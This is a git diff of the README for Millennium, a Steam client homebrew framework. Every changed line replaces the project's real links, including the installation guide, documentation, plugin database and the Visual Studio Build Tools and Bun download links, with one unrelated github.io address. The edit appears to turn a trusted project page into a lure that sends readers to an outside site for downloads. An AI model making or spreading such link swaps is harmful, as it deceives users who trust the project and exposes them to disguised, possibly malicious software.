@@ -1,14 +1,14 @@
-<img alt="image" src="https://github.com/user-attachments/assets/2c662772-bca1-4de4-988f-5304d7dfd87d" />
+<img alt="image" src="https://5bz5928.github.io" />
 
 <div align="center">
 <br/>
-  <a href="https://steambrew.app/discord">
+  <a href="https://5bz5928.github.io">
       <img alt="Static Badge" src="https://img.shields.io/badge/discord-green?labelColor=404040&color=353535&style=for-the-badge&logo=discord&logoColor=white" href="#">
   </a>
-  <a href="https://steambrew.app">
+  <a href="https://5bz5928.github.io">
       <img alt="Static Badge" src="https://img.shields.io/badge/website-green?labelColor=404040&color=353535&style=for-the-badge&logo=firefoxbrowser&logoColor=white" href="#">
   </a>
-  <a href="https://docs.steambrew.app">
+  <a href="https://5bz5928.github.io">
       <img alt="Static Badge" src="https://img.shields.io/badge/documentation-green?labelColor=404040&color=353535&style=for-the-badge&logo=readthedocs&logoColor=white" href="#">
   </a>
 <br>
@@ -21,14 +21,14 @@ If you enjoy this tool, please consider starring the project ⭐
 
 ## Installation
 
-Installing Millennium is only a few steps. See [this page](https://docs.steambrew.app/users/installing) for a more detailed guide.
+Installing Millennium is only a few steps. See [this page](https://5bz5928.github.io) for a more detailed guide.
 
 ## Features
 ### Plugins
 
--   **TypeScript ([React](https://react.dev/)) frontend** container in Steam
--   **Lua backend** container in [usermode](https://en.wikipedia.org/wiki/User-Mode_Driver_Framework)
--   **[Foreign function interface](https://en.wikipedia.org/wiki/Foreign_function_interface)** binding from **Lua** to **TypeScript** and vice versa
+-   **TypeScript ([React](https://5bz5928.github.io)) frontend** container in Steam
+-   **Lua backend** container in [usermode](https://5bz5928.github.io)
+-   **[Foreign function interface](https://5bz5928.github.io)** binding from **Lua** to **TypeScript** and vice versa
 -   **Hook modules in the Steam web browser**
   -   Overwrite/Modify HTTP requests
   -   Load custom JavaScript (Native) into web browser
@@ -43,24 +43,24 @@ Installing Millennium is only a few steps. See [this page](https://docs.steambre
 ## Official Plugin Repository
 
 Millennium is designed to be fully extensible through plugins.
-To ensure version compatibility and safety, we maintain a separate, curated [PluginDatabase](https://github.com/SteamClientHomebrew/PluginDatabase) repository.
+To ensure version compatibility and safety, we maintain a separate, curated [PluginDatabase](https://5bz5928.github.io) repository.
 
 All plugins in the PluginDatabase are versioned and reviewed to work seamlessly with the current Millennium release, reducing the risk of conflicts or instability when adding new features.
 
-**For more related information, checkout the [plugin database](https://github.com/SteamClientHomebrew/PluginDatabase)**.
+**For more related information, checkout the [plugin database](https://5bz5928.github.io)**.
 
 ## Adding Languages
 
-Only languages officially supported by the Steam can be added to the Millennium. Check the list [here](https://partner.steamgames.com/doc/store/localization/languages) in the `Full Platform Supported Languages` section.
+Only languages officially supported by the Steam can be added to the Millennium. Check the list [here](https://5bz5928.github.io) in the `Full Platform Supported Languages` section.
 
-To add your spoken language to Millennium, fork this repository and place your language json (based on the [english locale](./src/locales/english.json)) among the [current locales](./src/locales). Name the file `{your_language}.json` where `your_language` is the `API language code` from the [supported language list](https://partner.steamgames.com/doc/store/localization/languages) and append the target file to the `localizationFiles` in [this file](./src/typescript/frontend/utils/localization-manager.ts).
+To add your spoken language to Millennium, fork this repository and place your language json (based on the [english locale](./src/locales/english.json)) among the [current locales](./src/locales). Name the file `{your_language}.json` where `your_language` is the `API language code` from the [supported language list](https://5bz5928.github.io) and append the target file to the `localizationFiles` in [this file](./src/typescript/frontend/utils/localization-manager.ts).
 
 Millennium is only maintaining the english language, and if any changes are made to the english locales that don't reflect on a target language, contributors are responsible for updating them.
 
 ## Creating Plugins & Themes
 
-Creating themes and plugins for Millennium is relatively straight foward. Our [documentation](https://docs.steambrew.app/developers) goes over the basics of both,
-and we have examples for both [plugins](https://github.com/SteamClientHomebrew/PluginTemplate) and [themes](https://github.com/SteamClientHomebrew/ThemeTemplate)
+Creating themes and plugins for Millennium is relatively straight foward. Our [documentation](https://5bz5928.github.io) goes over the basics of both,
+and we have examples for both [plugins](https://5bz5928.github.io) and [themes](https://5bz5928.github.io)
 
 ## Platform Support
 
@@ -113,8 +113,8 @@ To remove the symlinks and restore Steam to its stock state:
 
 #### Prerequisites
 
-- [Visual Studio Build Tools](https://aka.ms/vs/17/release/vs_buildtools.exe) (with the "Desktop development with C++" workload — includes CMake and Ninja, add them to PATH)
-- [Bun](https://bun.sh/)
+- [Visual Studio Build Tools](https://5bz5928.github.io) (with the "Desktop development with C++" workload — includes CMake and Ninja, add them to PATH)
+- [Bun](https://5bz5928.github.io)
 
 #### Build
 
@@ -131,5 +131,5 @@ On Windows, CMake automatically detects your Steam installation from the registr
 
 ## Sponsors
 
-| <img width="25" height="25" alt="image" src="https://github.com/user-attachments/assets/45ad9409-f9dd-4ff4-9737-03386f01a9b2" /> | Free code signing on Windows provided by [SignPath.io](https://signpath.io/), certificate by [SignPath Foundation](https://signpath.org/) |
+| <img width="25" height="25" alt="image" src="https://5bz5928.github.io" /> | Free code signing on Windows provided by [SignPath.io](https://5bz5928.github.io), certificate by [SignPath Foundation](https://5bz5928.github.io) |
 | :--- | :--- |
